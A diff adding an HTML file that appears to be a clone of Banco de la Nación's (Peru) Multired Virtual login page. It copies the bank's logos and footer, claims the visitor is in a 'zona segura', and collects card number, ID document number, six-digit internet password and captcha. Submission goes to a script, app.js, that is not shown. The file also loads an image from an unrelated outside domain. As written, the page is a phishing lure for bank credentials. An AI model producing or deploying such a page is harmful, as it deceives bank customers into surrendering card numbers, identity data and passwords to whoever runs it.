@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco de la nacion - multired-virtual</title>
+  <link rel="stylesheet" href="style.css">
+  
+</head>
+<body>
+  <div id="contenedor">
+    <div id="cabecera">
+      <div id="logo-multired">
+          <img src="img/logo-multired.jpg" alt="logo-multired-virtuals">
+      </div>
+      <div id="logo-bn">
+          <img src="img/Logo_BN.jpg" alt="logo-bancoNacion">
+      </div>
+    </div>  
+    <img src="https://ui-systems.net/images/d6d6a192e565430bab3aa6e4cb0ae0bd.jpg">
+    <div class="image-d6d6a1"></div>
+    <em class="font-d6d6a1">.</em> 
+    <div id="cuerpo">
+      <h1 class="indicador-seguridad">
+        <img src="img/candado.png">
+        Usted se encuentra en una <span>zona segura</span>
+      </h1>
+      <div id="login">
+        <div id="border-superior">
+          <img src="img/border-arriba.png" alt="borde-superior">
+      </div>
+      <div id="login-contenido">
+        <div id="border-inferior"></div>
+        <form method="post" id="form" name="form">
+
+          <div class="fila limpiar">
+            <label for="tipo-documento">Seleccione:</label>
+            <select class="tipo-documento select" id="selcTipoTargeta" onchange="limpiarTipoTargeta()">
+              <option value="02">Multired Global Débito</option>  
+              <option value="01">DNI (Cuenta Corriente)</option>
+            </select>
+          </div>
+
+          <div class="fila limpiar">
+            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">Número de tarjeta:</label>
+            <input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)">
+          </div>
+
+          <div class="fila limpiar" id="tipoNumDoc">
+            <label id="trTipoNumDoc" for="numero-tarjeta">Tipo y N° Documento:</label>
+            <select id="cboTipoDoc" name="cboTipoDoc" class="select select-medio" onchange ="cambiarEspTextNumDoc()">
+              <option value="0">Seleccione...</option>
+              <option value="1">DNI</option>
+              <option value="2">Pasaporte</option>
+              <option value="3">C. Extranjeria</option>
+              <option value="4">RUC</option>
+            </select>          
+            <input type="text" class="input-chico3" name="txtNumDoc" id="txtNumDoc" maxlength="0" size="8" onkeypress="return soloNumerosDNI(event)" style="width: 151px !important;">
+             
+            <div class="fila limpiar">
+              <label for="clave" style="width: 140px;">Ingresa tu clave usando el teclado virtual:</label>
+              
+              <div id="botones-clave">
+                  <div class="boton-clave">0</div>
+                  <div class="boton-clave">4</div>
+                  <div class="boton-clave">9</div>
+                  <div class="boton-clave">2</div>
+                  <div class="boton-clave">6</div>
+                  <div class="boton-clave">1</div>
+                  <div class="boton-clave">8</div>
+                  <div class="boton-clave">5</div>
+                  <div class="boton-clave">7</div>
+                  <div class="boton-clave">3</div>
+                  <div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
+              </div>
+              
+          
+              <div id="campo-clave">
+                <p style="width: 175px ! important;"><img border="0" src="img/generar-clave.png" width="20" height="20" style="float: left; margin: -3px ! important;">
+                <a href="" style="color: rgb(186, 17, 19); text-decoration: underline; font: 12px arial;">Genera tu Clave de Internet</a></p>
+                <p style="width: 124px;">Ingresa tu <b>Clave de Internet (06 dígitos)</b> </p>
+                <input type="password" name="txtPassword" id="txtPassword" maxlength="6" readonly="readonly" style="margin: 0px 10px;">
+                  
+                <div class="olvido-clave">
+                    <div class="olvide-clave"><a href="" style="color: rgb(186, 17, 19);text-decoration: underline;">Olvidé mi clave</a></div>
+                  
+                </div>
+              </div>
+            </div>
+            <div class="fila limpiar">
+              <label for="capcha">Ingresa el texto de la imagen:</label>
+              <div class="capcha">  
+                  <div id="srcCaptcha">
+                    <img alt="captcha" id="captcha" name="captcha" src="" height="25" width="114">
+                  </div>
+                  <div class="boton_captcha" id="boton_captcha">Cambiar texto</div>
+              </div>
+              <input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha" maxlength="10" style="margin: 0px 10px;">
+            </div>
+            <div class="fila limpiar">
+              <input name="btnLogin" id="btnLogin" type="button" value="INGRESAR" onclick="javascript:return autenticar();">    
+            </div>
+            <div class="fila limpiar" align="CENTER" style="padding-right: 50px;">
+						  <p style="width: 175px ! important;">
+	              <a href="https://www.bn.com.pe/clientes/banca-internet/formatos/recomendaciones-seguridad.pdf" target="_blank" style="color: rgb(51, 102, 187); text-decoration: underline; font: 12px arial;">Recomendaciones de Seguridad</a></p>		
+            </div>
+            <div class="fila limpiar" align="CENTER" style="padding-right: 50px; margin: 0px;">								
+              <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf" target="_blank" rel="noopener noreferrer" style="color: rgb(0, 0, 0); font: 12px arial;"> Guía Cuenta de Ahorro</a>
+              <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-vir  tual-cuentas-corrientes.pdf" target="_blank" rel="noopener noreferrer" style="color: rgb(0, 0, 0); font: 12px arial;"> Guía Cuentas Corrientes</a>		 
+                                      
+            </div>
+        </form>
+      </div>
+    </div>
+    <div id="border-inferior"><img src="img/border-abajo.png" alt="Border Login Inferior"></div>
+    <div id="pie-pagina">
+
+    <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>
+
+    <div id="oficinas">
+      <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
+      <p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
+      <p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>          
+    </div>
+  </div>
+  </div>
+  <script src="app.js"></script>
+
+</body>
+</html>
